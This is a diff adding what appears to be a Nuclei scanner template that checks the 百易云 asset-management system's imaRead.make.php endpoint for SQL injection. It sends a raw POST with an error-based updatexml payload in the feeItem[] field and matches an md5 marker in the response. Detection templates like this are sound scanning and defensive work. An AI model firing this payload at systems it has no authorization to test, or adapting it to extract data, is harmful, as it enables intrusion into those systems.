@@ -1,0 +1,33 @@
+id: baiyishequ-imaRead-sqli
+info:
+  name: 百易云资管系统 imaRead.make.php SQL注入漏洞
+  author: leadlife
+  severity: high
+  description: 
+  reference: 
+    - https://mp.weixin.qq.com/s/NnHd9L1C7p8icCbCEIhs6A
+  classification:
+    cve-id: 
+  metadata:
+    verified: false
+    fofa-query: demo
+    tips: 可能都修复了
+    repair:
+    version:
+  tags: baiyishequ,sqli
+
+http:
+  - raw:
+      - |
+        POST /adminx/imaRead.make.php?act=remake HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246
+
+        feeItem[]=1+AND+updatexml(1,concat(0x7e,md5(12345678)),1)
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - contains_all(body,'25d55ad283aa400af')
+        condition: and
